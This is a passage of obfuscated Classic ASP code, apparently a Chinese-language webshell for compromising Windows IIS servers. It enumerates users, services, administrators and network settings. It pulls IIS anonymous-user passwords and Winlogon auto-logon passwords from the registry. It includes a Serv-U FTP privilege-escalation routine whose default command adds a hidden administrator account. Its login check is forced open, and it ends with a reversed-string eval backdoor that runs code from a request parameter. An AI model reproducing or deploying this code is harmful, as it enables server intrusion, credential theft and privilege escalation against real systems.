rny"",User.PasswordRequired
dvs 0
rny"","&#36134;&#25143;&#24050;&#20572;&#29992;"
rny"",User.AccountDisabled
dvs 1
rny"","&#36134;&#25143;&#24050;&#38145;&#23450;"
rny"",User.IsAccountLocked
dvs 0
rny"","&#29992;&#25143;&#37197;&#32622;&#25991;&#20214;"
rny"",User.Profile
dvs 1
rny"","&#29992;&#25143;&#30331;&#24405;&#33050;&#26412;"
rny"",User.LoginScript
dvs 0
rny"","&#29992;&#25143;&#20027;&#25991;&#20214;&#22841;"
rny"",User.HomeDirectory
dvs 1
rny"","&#29992;&#25143;&#20027;&#39537;&#21160;&#22120;"
rny"",User.Get("HomeDir"&rmq&"Drive")
dvs 0
rny"","&#25551;&#36848;&#65306;"
rny"",User.Description
If Err Then Err.Clear
End Sub
Sub yhi()
Dim wzp,qkd,xns
Set xns=getObject("WinNT://.")
xns.Filter=Array("User")
wvy"User"
i=0
For Each wzp in xns
i=i+1
faq"100%"" style=""cursor:pointer;"" onclick=""javascript:ipr('usertr_"&i&"')"
wfp
rny 10,"<div style='width:10px;height:10px;' id='ss_"&i&"'>"&uvg(bvy("3"))&"</div>"
aiy(wzp.Name)
cqm
Next
jji(Err)
wvy"UserGroup"
xns.Filter=Array("Group")
oob
i=0
For Each qkd in xns
dvs(i mod 2)
rny"",qkd.Name
rny"",qkd.Description
i=i+1
Next
cqm
j"</span>"
jji(Err)
End Sub
Function glj(syh)
Dim wzp,qkd,bca
Set wzp=getObject("WinNT://./"&syh&",user")
For Each qkd in wzp.Groups
bca=bca+1
if bca>1 then glj=glj&" , "
glj=glj&" "&qkd.Name
Next
End Function
sub ryd()
wvy"&#31995;&#32479;&#36827;&#31243;"
oob
wfp
rny 100,"<B>&#36827;&#31243;&#21517;</B>"
rny 100,"<B>&#25551;&#36848;</B>"
rny 60,"<B>&#21551;&#21160;&#31867;&#22411;</B>"
rny"","<B>&#20301;&#32622;</B>"
on error resume next
dim sxk,jzd,fxw
i=1
    for each obj in getObject("WinNT://.")
if  trim(OBJ.StartType)="" then
else
i=i+1
if OBJ.StartType=2 then sxk="&#33258;&#21160;"
if OBJ.StartType=3 then sxk="&#25163;&#21160;"
if OBJ.StartType=4 then sxk="&#31105;&#29992;"
dvs(i mod 2)
rny"e",obj.Name
rny"w",obj.DisplayName
rny"p",sxk
rny"",obj.path
end if
next
cqm
err.clear
end sub
Sub qpf()
dim gzj,rto,i,vqd,qde,azb,riu,yyy,lfx,mea
On Error Resume Next
Set qde=GetObject("IIS://LocalHost/W3SVC")
If err Then
j"[ERROR]="&Err.Description&"<br>"
Exit sub
End If
oob
xlj 2
rny"",b("ID")
rny"",b("Name")
rny"",b("User")
rny"",b("Pass")
rny 130,b("Ip&Port")
rny"",b("Domain")
rny"",b("Path")
i=0
For Each vqd In qde
m=i mod 2
rto=replace(vqd.AdsPath,Left(vqd.Adspath,22),"")
if IsNumeric(rto)=true then
dvs m
i=i+1
set IIs=qde.GetObject("IIsWebServer",rto)
if err Then
rny"'% colspan='7",Err.Description
else
set azb=iis.getobject("IIsWebVirtualDir","Root")
riu=IIS.serverBindings
lfx="":mea=""
for n=0 to ubound(riu)
yyy=split(riu(n),":")
lfx=lfx&iif(yyy(0)<>"",yyy(0),"&#40664;&#35748;IP")&":"&yyy(1)&"<br>"
mea=mea&yyy(2)&"<br>"
next
rny"",i
rny"",iis.servercomment
rny"",azb.AnonymousUserName
rny"",azb.AnonymousUserPass
rny"",lfx
rny"",mea
rny"",azb.path
End If
end if
Next
ctn=ctn&"</table>"
j ctn
Set qde=Nothing
End Sub
sub jld()
On Error Resume Next
dim lcr,ivf,dxb,elf,kti,oxx,ejg,IPKey,nuy,nmc,GateWay,gja,rzb,ruy,mjr,ggg,eyd,kbb,cnh,zif
if ogg(jdu(1))=false then
j jdu(1)&"&#32452;&#20214;&#19981;&#23384;&#22312;&#65292;&#26080;&#27861;&#36827;&#34892;&#30456;&#20851;&#26816;&#27979;&#65281;"
exit sub
end if
pmg
wvy"[&#32593;&#32476;"&"&#25506;&#27979;]"
pkm
lcr="HK"&xxk&"LM\SYSTEM\CurrentControl"&rxt&"Set\Services\Tcpip\Parameters\EnableSecurityF"&kei&"ilters"
execute "ivf=moi.RegR"&qnj&"ead(lcr)"
If ivf=0 or ivf="" Then
dxb=1
End If 
elf="HK"&xxk&"LM\SYSTEM\Control"&iws&"Set001\Services\Tcpip\Linkage\Bind"
execute "kti=moi.RegRea"&nkv&"d(elf)"
hk="HK"&xxk&"LM\SYSTEM\Control"&iws&"Set001\Services\Tcpip\Enum\Count"
execute "kk=moi.RegRea"&njk&"d(hk)"
oob
uxr="&#27963;&#21160;&#32593;&#21345;ip&#65306;"
If IsArray(kti) Then 
For i=LBound(kti) To UBound(kti)-1
oxx=Replace(kti(i),"\Device\","")
dvs 0
j"<td>"
j"&#32593;&#21345;"&i&"&#30340;&#24207;&#21015;&#20026;:"&oxx
j"<br>"
ejg="HKEY_LOCAL_MACHINE\SYSTEM\Control"&iws&"Set001\Services\Tcpip\Parameters\Interfaces\"
IPKey=ejg&oxx&"\IPAddress"
execute "nuy=moi.RegRea"&dyc&"d(IPKey)"
If nuy(0)<>"" Then
For x=Lbound(nuy) to Ubound(nuy)
j"<li>IP&#22320;"&"&#22336;"&x&"&#20026;:"&nuy(x)
if i=kk then j piq(" &#24403;&#21069;&#27963;&#21160;&#32593;&#21345;"):uxr=uxr&piq(nuy(x))&"&#65292;"
Next
Else
j"<li>IP&#22320;"&"&#22336;&#26080;&#27861;&#35835;&#21462;"&"&#25110;&#27809;&#26377;&#35774;&#32622;<br>"
End if
nmc=ejg&oxx&"\Defaul"&dyn&"tGateway"
execute "GateWay=moi.RegRea"&kex&"d(nmc)"
If isarray(GateWay) Then
For x=Lbound(Gateway) to Ubound(Gateway)
j"<li>&#32593;&#20851;"&x&":"&Gateway(x)&"<br>"
Next
Else
j"<li>&#32593;&#20851;&#26080;&#27861;&#35835;&#21462;&#25110;&#27809;&#26377;&#35774;&#32622;<br>"
End if
gja=ejg&oxx&"\NameServ"&mlo&"er"
execute "rzb=moi.Re"&wva&"gRead(gja)"
If rzb<>"" Then
j"<li>&#32593;&#21345;"&"DNS&#20026;:"&rzb&"<br>"
Else
j"<li>&#40664;&#35748;"&"DNS&#26080;&#27861;&#35835;&#21462;&#25110;&#27809;&#26377;&#35774;&#32622;<br>"
End If
if dxb=1 Then 
j"<li>&#27809;Tcp/IP&#31579;&#36873;<br>"
else
ruy="\TCPAllowedPorts"
mjr="\UDPAllowedPorts"
ggg=ejg&oxx&ruy
eyd=ejg&oxx&mjr
execute "kbb=moi.R"&elp&"egRead(ggg)"
If kbb(0)="" or kbb(0)=0 Then
j"<li>&#20801;&#35768;"&"&#30340;tcp&#31471;&#21475;&#20026;:&#20840;&#37096;<br>"
Else
j"<li>&#20801;&#35768;"&"&#30340;tcp&#31471;&#21475;&#20026;:"
For j = LBound(kbb) To UBound(kbb)
j kbb(j)&","
Next
j"<Br>"
End if
execute "cnh=moi.Reg"&csv&"Read(eyd)"
If cnh(0)="" or cnh(0)=0 Then
j"<li>&#20801;&#35768;"&"&#30340;udp&#31471;&#21475;&#20026;:&#20840;&#37096;<br>"
Else
j"<li>&#20801;&#35768;"&"&#30340;udp&#31471;&#21475;&#20026;:"
for j = LBound(cnh) To UBound(cnh)
j cnh(j)&","
next
j"<br>"
End if
End if
j"</td>"
Next
err.clear
end if
cqm
end sub
function kzs()
wvy"[&#31649;"&"&#29702;"&"&#21592;"&"&#29992;"&"&#25143;]"
pkm
on error resume next 
oob
Set tN=axu("WSc"&puf&"ript.Network")
Set qkd=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in qkd.Members
dvs 1:rny"80","&#36134;&#21495;&#21517;&#65306;":rny"",admin.Name
Next
if err then
j Err.Description
end if
cqm
end function
sub ckm()
dim qbh
yce"Application &#21464;&#37327;&#21015;&#34920;"
oob
wfp
rny 110,"<b>&#21464; &#37327; &#21517; &#31216;</b>"
rny"","<b>&#20540;</b>"
i=1
for each apps in Application.Contents
i=i+1
dvs(i mod 2)
rny"",apps
if isobject(Application.Contents(apps)) then
qbh="[&#23545;&#35937;]"
elseif isarray(Application.Contents(apps)) then
qbh="[&#25968;&#32452;]"
else
qbh=grl(Application.Contents(apps))
end if
rny"",qbh
next
cqm
end sub
sub ilp()
dim dpg
yce"Session &#21464;&#37327;&#21015;&#34920;"
oob
wfp
rny 110,"<b>&#21464; &#37327; &#21517; &#31216;</b>"
rny"","<b>&#20540;</b>"
i=1
for each sens in Session.Contents
i=i+1
dvs(i mod 2)
rny"d",sens
if isobject(Session.Contents(sens)) then
dpg="[&#23545;&#35937;]"
elseif isarray(Session.Contents(sens)) then
dpg="[&#25968;&#32452;]"
else
dpg=grl(Session.Contents(sens))
end if
rny"",dpg
next
cqm
end sub
sub daj()
yce"Req"&"ue"&"st.S"&"erv"&"erVa"&"ria"&"bles &#21464;&#37327;&#21015;&#34920;(&#21547;&#23458;&#25143;&#31471;&#20449;&#24687;)"
oob
wfp
rny 110,"<b>&#21464; &#37327; &#21517; &#31216;</b>"
rny"","<b>&#20540;</b>"
i=1
for each apps in Request.ServerVariables
i=i+1
dvs(i mod 2)
rny"e",apps
rny"",grl(xhc(apps))
next
cqm
end sub
sub www()
On Error Resume Next
pmg
yce jdu(1)&".Environments &#21464;&#37327;&#21015;&#34920;"
oob
wfp
rny 110,"<b>&#21464; &#37327; &#21517; &#31216;</b>"
rny"","<b>&#20540;</b>"
i=1
for each envs in moi.Environment
i=i+1
envsa = split(envs,"=")
dvs(i mod 2)
rny"w",envsa(0)
rny"",grl(envsa(1))
next
cqm
end sub
'!>
sub sbn()
On Error Resume Next
oar"&#26381;&#21153;&#22120;&#22522;&#26412;&#20449;&#24687;",3,1
oob
xlj 0
rny 110,"&#26381;&#21153;&#22120;&#22320;&#22336;"
rny"","&#21517;&#31216; "&xhc("SERVER_NAME")&" (IP:"&cey&") &#31471;&#21475;:"&xhc("SERVER_PORT")
tnow = now():oknow = cstr(tnow)
if oknow <> year(tnow) & "-" & month(tnow) & "-" & day(tnow) & " " & hour(tnow) & ":" & right(FormatNumber(minute(tnow)/100,2),2) & ":" & right(FormatNumber(second(tnow)/100,2),2) then oknow = oknow & " (&#26085;&#26399;&#26684;&#24335;&#19981;&#35268;&#33539;)"
rny"","&#26381;&#21153;&#22120;&#26102;&#38388;"
rny"",oknow
dvs 0
pjo
rny"","&#26381;&#21153;&#22120;&#25805;&#20316;&#31995;&#32479;"
'<!
iak=iak&tyh("jld","",b(" [&#31471;&#21475;&&#32593;&#32476;]"))
'!>
rny"",iak
rny"","IIS&#29256;"
rny"",xhc("SERVER_SOFTWARE")
dvs 0
rny"","&#33050;&#26412;&#36229;&#26102;&#26102;&#38388;"
rny"",Server.ScriptTimeout
rny"","&#26381;&#21153;&#22120;&#33050;&#26412;&#24341;&#25806;"
rny"",ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion&tyh("npi","",b(" [&#33050;&#26412;&#25506;&#27979;]"))
dvs 0
rny"","&#26412;&#25991;&#20214;&#36335;&#24452;"
rny"",xhc("PATH_TRANSLATED")
rny"","ServerVariables"
rny"",Request.ServerVariables.Count&" &#20010;"&uyy
dvs 0
rny"","&#26381;&#21153;&#22120;CPU&#36890;&#36947;&#25968;"
rny"",ddo&" &#20010;"
rny"","&#20840;&#23616;&#21644;&#20250;&#35805;&#21464;&#37327;"
'<!
if Application.Contents.count>0 then eaz=" "&tyh("ckm","",b(" [&#21015;&#34920;]"))
if Session.Contents.count>0 then bia=" "&tyh("ilp","",b(" [&#21015;&#34920;]"))
if Request.ServerVariables.Count>0 then uyy=" ["&tyh("daj","","Requ"&"est.Ser"&"verVa"&"riables &#21015;&#34920;")&"] "
'!>
rny"","Application &#21464;&#37327; "&Application.Contents.count&" &#20010;"&eaz&", Session &#21464;&#37327; "&Session.Contents.count&" &#20010;"&bia&"&nbsp;&#24403;&#21069;&#20250;&#35805;ID: "&Session.SessionId()
dvs 0
pmg
dim qxz
qxz="&#35835;&#21462;&#22833;&#36133;(&#32452;&#20214;&#19981;&#21487;&#29992;)"
rny"","&#26381;&#21153;&#22120;CPU&#35814;&#24773;"
rny"",okCPU
rny"","&#20840;&#37096;&#26381;&#21153;&#22120;&#29615;&#22659;"
'<!
if moi.Environment.count>0 then bvn=" "&tyh("www","",b("[W"&"Ss"&"h"&"ell.Environment &#21015;&#34920;]"))
'!>
execute "rny"""",moi.Environm"&vfo&"ent.count&"" &#20010;""&bvn"
dvs 0
pcnamekey="HK"&xxk&"LM\SYSTEM\CurrentControl"&rxt&"Set\Control\ComputerName\ComputerName\ComputerName"
execute "pcname=moi.RegRea"&qpe&"d(pcnamekey)"
if pcname="" Then pcname="&#26080;&#27861;&#35835;_&#21462;&#20027;&#26426;&#21517;."
rny"","&#20027;&#26426;&#21517;"
rny"",pcname
vow="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControl"&rxt&"Set\Control\Term"&fgo&"inal Server\Wds\rdpwd\Tds\tcp\PortNumber"
execute "lrm=moi.RegR"&lot&"ead(vow)"
If lrm="" Then lrm="&#26080;&#27861;"&"&#35835;&#21462;."
rny"","Term"&fgo&"inal Service&#31471;&#21475;"
rny"",lrm
dvs 0
AdminNameKey="HKEY_LOCAL_MACHINE\SOFT"&cug&"WARE\Microsoft\Window"&xpa&"s NT\Curr"&kyv&"entVersion\Winlo"&daw&"gon\AltDefaultUserName"
execute "AdminName=moi.Re"&rmz&"gRead(AdminNameKey)"
if adminname="" Then AdminName="Administrator"
on error resume next 
execute "displogin=moi.RegRea"&zaw&"d(""HKEY_LOCAL_MACHINE\SOFT""&cug&""WARE\Microsoft\Windows\Curr""&kyv&""entVersion\Policies\System\DontDisplayLastUserName"")"
If displogin="" or displogin=0 Then disply=" &#65309; " else disply=" &#8800; "
rny"","&#40664;"&"&#35748;&#31649;"&"&#29702;"&"&#21592;"
ito=IIf(ogg(jdu(1)),AdminName&disply&"&#19978;&#27425;"&"&#30331;"&"&#24405;&#29992;"&"&#25143;",qxz)
'<!
ito=ito&"&nbsp;"&tyh("kzs","",b(" [&#35814;&#24773;]"))
'!>
rny"",ito
isAutologin="HKEY_LOCAL_MACHINE\SOFT"&cug&"WARE\Microsoft\Window"&xpa&"s NT\Curr"&kyv&"entVersion\Winlo"&daw&"gon\Aut"&keh&"oAdminLogon"
execute "Autologin=moi.R"&xfw&"egRead(isAutologin)"
rny"","&#29992;&#25143;&#33258;&#21160;&#30331;&#20837;"
if Autologin=0 or Autologin="" Then
rny"","&#26410;&#21551;&#29992;"
Else
rny"","&#21551;&#29992;"
execute "Adminr=moi.Reg"&mmm&"Read(""HKEY_LOCAL_MACHINE\SOFT""&cug&""WARE\Microsoft\Window""&xpa&""s NT\Curr""&kyv&""entVersion\Winlo""&daw&""gon\Defa""&zkf&""ultUserName"")"
execute "Passwd=moi.R"&rkh&"egRead(""HKEY_LOCAL_MACHINE\SOFT""&cug&""WARE\Microsoft\Window""&xpa&""s NT\Curr""&kyv&""entVersion\Winlo""&daw&""gon\Defaul""&fst&""tPassword"")"
j piq("(&#29992;&#25143;&#21517;:"&Adminr&" &#65292;&#23494;&#30721;:"&Passwd&")")
End if
cqm
err.clear:pkm
end sub
sub pjo()
On Error Resume Next
pmg
execute "Set WshSysEnv = moi.Env"&bno&"ironment(""SYSTEM"")"
iak = cstr(WshSysEnv("OS"))
ddo = cstr(WshSysEnv("NUMBE"&kjo&"R_OF_PROCESSORS"))
okCPU = cstr(WshSysEnv("PROC"&dsy&"ESSOR_IDENTIfIER"))
if isempty(ddo) then
ddo = xhc("NUMBE"&kjo&"R_OF_PROCESSORS")
end if
if ddo & "" = "" then
ddo = "(&#26410;&#30693;)"
end if
if iak & "" = "" then
iak = "(&#26410;&#30693;)"
end if
end sub
function ogg(qps)
On Error Resume Next
ogg=false
set clw=axu(qps)
If -2147221005 <> Err then ogg=true
set clw=nothing
err.clear
End function
function grl(ipw)
  grl = ipw
  grl = gej(grl)
  grl = replace(grl,chr(10),"<br>")
end function
sub logout()
session.Abandon()
bzg"n",ghq,"_parent":jzg:itm"n.submit()"
end sub
sub p()
j"<br>"
end sub
function mvs(vii)
mvs="<div name='"&vii&"' id='"&vii&"' style=""display:none;"">www</div>"
end function
sub cms()
dim igb,egn,Tlnt,vow,lrm,vty,jqx,opo,paths,i
On Error Resume Next
if ogg(jdu(1))=false then exit sub
pmg
oar"&#31995;&#32479;&#24403;&#21069;"&"&#36335;"&"&#24452;&#21464;&#37327;",6,1
execute "opo=moi.Environm"&xlt&"ent.item(""Path"")"
oob
paths=split(opo,";")
dvs 0
For each x in paths
if x<>"" then
if i mod 2=0 then dvs 0
rny"50%","<li>"&iif(instr(x,":\")>0,qjd(x,b(x)),x)
i=i+1
end if
next
if i mod 2=1 then rny"","&nbsp;"
cqm
cqm
end sub
function oar(t,n,d)
dim gvy
if d=0 then
d="none"
gvy=uvg(bvy("3"))
else
d=""
gvy=piq(bvy("4"))
end if
oob
xlj 1:rny"10' % id='ss_"&n&"",gvy
rny"",mytitle(t)&"<span id='y"&n&"'></span>"
cqm
faq"100%"" id='w_"&n&"' style=""display:"&d&";":xlj 0:j"<td>"
end function
fua
if cyk<>"" then
session("cyk")=cyk
end if
if session("cyk")="" then
cyk=iax
session("cyk")=cyk
end if
if session("cyk")<>"" and right(session("cyk"),1)<>"\" then session("cyk")=session("cyk")&"\"
if xhc("QUERY_STRING")=yqo then session("login")="in"
'<!
session("login")="in"
'!>
if session("login")="" then vqj
j glm
itm"function ipr(obj){var sender=event.srcElement;var myhand='ss_'+obj.split('_')[1];if(document.getElementById(obj).style.display=='none'){document.getElementById(obj).style.display='';document.getElementById(myhand).innerHTML='"&piq(bvy("4"))&"';sender.className='showhref';}else{document.getElementById(obj).style.display='none';document.getElementById(myhand).innerHTML='"&uvg(bvy("3"))&"';sender.className='hidehref';}}function att(){if(document.getElementById('filesafe').checked==true){document.getElementById('att').innerHTML='(&#21152;&#38145;)&nbsp;&nbsp;';}else{document.getElementById('att').innerHTML='(&#21407;&#23646;&#24615;)&nbsp;&nbsp;';}}"
select case zxp
'<!
case "kad":kad()
case "ckm":ckm
case "ilp":ilp
case "daj":daj
case "www":www
case "yhi":yhi:ryd
case "qpf":qpf
case "ryd":ryd
case "iwt":iwt
case "kzs":kzs
case "yrw":yrw
case "cpo":cpo
case "pqy":txk
case "rta":rta
case "npi"
set abc=new llbf:abc.qty():set abc=nothing
case "ome"
set abc=new llbf:abc.ome(""):set abc=nothing
case "ckz"
set abc=new llbf:abc.ckz:set abc=nothing
case "bgr"
set abc=new llbf:abc.bgr:set abc=nothing
case "jjj"
set abc=new llbf:abc.jjj(session("cyk")):set abc=nothing
'!>
case"kxx":kxx
case "pry":pry
case "fuq"
set abc=new llbf:abc.fuq(session("cyk")):set abc=nothing
case "dnk"
set abc=new llbf:abc.dnk(session("cyk")):set abc=nothing
case "sbn":sbn
case "logout":logout
case "cgt"
set abc=new llbf:abc.cgt(dez):set abc=nothing
case "zzk"
set abc=new llbf:abc.zzk():set abc=nothing
case "sim"
set abc=new llbf:abc.sim(dez):set abc=nothing
case "bgu"
set abc=new llbf:abc.bgu(dez):set abc=nothing
case "qzn"
set abc=new llbf:abc.qzn(dez):set abc=nothing
case "uuv"
set abc=new llbf:abc.uuv(dez):set abc=nothing
case "llk"
set abc=new llbf:abc.llk(dez):set abc=nothing
case "ert"
set abc=new llbf:abc.ert(dez):set abc=nothing
case "ewg"
set abc=new llbf:abc.ewg(dez):set abc=nothing
case "kca"
set abc=new llbf:abc.kca(dez):set abc=nothing
case "jld":jld
case "fjk"
set abc=new llbf:abc.fjk():set abc=nothing
case "msq"
set abc=new llbf:abc.msq(dez):set abc=nothing
case "ofv"
set abc=new llbf:abc.ofv():set abc=nothing
case else
rso()
end select
qou()
Function ayt()
On Error Resume Next
dim qps,sqy,mhx,ocm
pmg
execute "sqy=moi.RegRe"&zyq&"ad(""HKEY_LOCAL_MACHINE\SYSTEM\Ra""&mds&""dmin\v2.0\Server\Parameters\Parameter"")"
if err then err.clear:exit function
If IsArray(sqy) Then
For i = 0 To UBound(sqy)
If  Len (hex(sqy(i)))=1 Then 
qps=qps & "0" & CStr(Hex(sqy(i)))
Else
qps=qps & Hex(sqy(i))
End If 
Next
Else
qps="Error! Can't Read!"
End If
qps=piq("Parameter:")&qps
execute "mhx=moi.RegRea"&ype&"d(""HKEY_LOCAL_MACHINE\SYSTEM\Ra""&mds&""dmin\v2.0\Server\Parameters\Port"")"
If IsArray(mhx) Then 
ocm=Clng("&H"&CStr(Hex(mhx(1)))&CStr(Hex(mhx(0))))
Else 
ocm="Error! Can't Read!"
End If
ocm=piq("Port:")&ocm
oar"R"&"a"&"dm"&"in"&"&nbsp;&nbsp;&nbsp;&nbsp;"&qps&"&nbsp;&nbsp;"&ocm,5,1
End Function
'<!
Sub rta()
On Error Resume Next
Dim xbd
xbd="Myftp"
vuj="User "&suUser&vbCrLf
dov="Pass "&suPass&vbCrLf
ysv="-DELETED"&dzv&"OMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&nport&vbCrLf
mt="SITE MAINTENAN"&awh&"CE"&vbCrLf
znk="-Se"&bej&"tDOMAIN"&vbCrLf&"-Domain="&xbd&"|0.0.0.0|"&nport&"|-1|1|0"&vbCrLf&"-TZOE"&pdy&"nable=0"&vbCrLf&" TZOKey="&vbCrLf
boo="-SetUSERS"&kxl&"etUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&nport&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
"-HomeDir="&ovc()&"\\"&vbCrLf&"-Login"&kwa&"MesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPa"&wtn&"ths=1"&vbCrLf&_
"-NeedSe"&ysl&"cure=0"&vbCrLf&"-HideHi"&vbk&"dden=0"&vbCrLf&"-Alwa"&joz&"ysAllowLogin=0"&vbCrLf&"-Chan"&lbe&"gePassword=0"&vbCrLf&_
"-QuotaEn"&zyn&"able=0"&vbCrLf&"-MaxUsersL"&aph&"oginPerIP=-1"&vbCrLf&"-Spe"&qya&"edLimitUp=0"&vbCrLf&"-SpeedLimitD"&xcp&"own=0"&vbCrLf&_
"-MaxNr"&wkx&"Users=-1"&vbCrLf&"-IdleTim"&lhg&"eOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAINTENAN"&awh&"CE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&ovc()&"\\|RW"&xxx&"AMELCDP"&vbCrLf
opy="QUIT"&vbCrLf
wvy("Serv"&nan&"-U FTP Exp")
Select Case dez
Case "11"
gzh
Case "22"
xcy
Case "33"
ayd
Case "44"
rhj
Case "55"
bad
Case Else
If IsObject(Session("aaa"))Then Session("aaa").abort:j"aaa"
If IsObject(Session("bbb"))Then Session("bbb").abort:j"bbb"
If IsObject(Session("ccc"))Then Session("ccc").abort:j"ccc"
set Session("aaa")=nothing
set Session("aaa")=nothing
set Session("aaa")=nothing
bzg"gem","",""
ekf"zxp","hidden","rta"
ekf"dez","hidden",11
j"<center><b>Add Temp Domain</b><br>"
faq "80%"
j"<hr>"
xlj 1
rny 80,"Local user"
rny"",ohp("suUser","text","LocalAdmini"&wsf&"strator")
rny"80m","Local pass"
rny"",ohp("suPass","text","#l@$ak#.lk;0@P")
dvs 1
rny"m"," Local port"
rny"",ohp("suPort","text","439"&guf&"58")
rny"10%","Sys drive"
rny"40%",ohp("suPath","text",ovc())
dvs 1
rny"","New user"
rny"",ohp("nuser","text","go")
rny"","New pass"
rny"",ohp("npass","text","od")
dvs 1
rny"","New port"
rny"",ohp("nport","text","60000")
rny""," "
rny"",ohp("","submit","Go")&" "&ohp("","reSet","ReSet")
cqm
j"</center>"
jzg
End Select
j"<center>"
faq"80%"
j"<hr>"
xlj 0
rny"c",tyh("rta","","Add domain")
rny"c",tyh("rta",44,"Exec cmd")
rny"c",tyh("rta",55,"Clean domain")
cqm
j"</center>"
j sxi
End Sub
Sub gzh()
On Error Resume Next
Set aaa=axu(jdu(8))
aaa.open"GET","http://127.0.0.1:"&suPort&"/goldsun/up"&bxi&"admin/s1",True,"",""
aaa.send vuj&dov&mt&ysv&znk&boo&opy
j "http://127.0.0.1:"&suPort&"/goldsun/up"&bxi&"admin/s1"
j "<br>"&vuj&"<br>"&dov&"<br>"&mt&"<br>"&ysv&"<br>"&znk&"<br>"&boo&"<br>"&opy
Set Session("aaa")=aaa
ifz"Connecting 127.0.0.1:"&suPort&" using "&suUser&",pass:"&suPass&"..."
rhj
End Sub
Sub xcy()
'On Error Resume Next
rhj()
Set bbb=axu(jdu(8))
bbb.open"GET","http://"&cey&":"&nport&"/goldsun/up"&bxi&"admin/s2",False,"",""
bbb.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&suCmd&vbCrLf&opy
Set Session("bbb")=bbb
ifz"Executing iaz..."
j"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
j Replace(bbb.ResponseText,chr(10),"<br>")&"</div></center>"
End Sub
Sub ayd()
On Error Resume Next
Set ccc=axu(jdu(8))
ccc.open "GET","http://127.0.0.1:"&suPort&"/goldsun/up"&bxi&"admin/s3",True,"",""
ccc.send vuj&dov&mt&ysv&opy
Set Session("ccc")=ccc
ifz"Temp domain deleted!"
End Sub
Function ovc()
On Error Resume Next
set zvv=axu(jdu(0))
ovc=Lcase(Left(zvv.GetSpecialFolder(0),2))
set zvv=nothing
If ovc=""Then ovc="c:"
End Function
Sub rhj()
If nuser=""Then nuser="go"
If npass=""Then npass="od"
If nport=""Then nport="60000"
bzg"gem","",""
ekf"zxp","hidden","rta"
ekf"dez","hidden",22
j"<center><b>Execute Cmd</b><br>"
faq "80%"
j"<hr>"
xlj 1
rny"80m","iaz"
rny"'% colspan='3",ohp("suCmd","text","cmd /c net u"&ccc&"ser bloodsword$ 0kee /add & net loc"&cgj&"algroup administrators bloodsword$ /add")
dvs 1
rny"m","Ftp user"
rny"40%",ohp("nuser","text",nuser)
rny"10%","Ftp pass"
rny"40%",ohp("npass","text",npass)
dvs 1
rny"","Ftp port"
rny"",ohp("nport","text",nport)
rny""," "
rny"",ohp("","submit","Go")&" "&ohp("","reSet","ReSet")
cqm
j"</center>"
jzg
End Sub
Sub bad()
bzg"gem","",""
ekf"zxp","hidden","rta"
ekf"dez","hidden",33
j"<center><b>Clean Temp Domain</b><br>"
faq"80%"
j"<hr>"
xlj 1
rny"20%","Local user"
rny"",ohp("suUser","text","LocalAdmini"&wsf&"strator")
rny"20%","Local pass"
rny"",ohp("suPass","text","#l@$ak#.lk;0@P")
dvs 1
rny"","Local port"
rny"",ohp("suPort","text","439"&guf&"58")
rny"","Temp domain port"
rny"",ohp("nport","text","60000")
dvs 1
rny"'% align='center' colspan='4",ohp("","submit","Go")&" "&ohp("","reSet","ReSet")
cqm
j"</center>"
jzg
End Sub
'!>
%>
<% Function MorfiCoder(Code) MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCoder(")/*/z/*/(tseuqer lave") %>
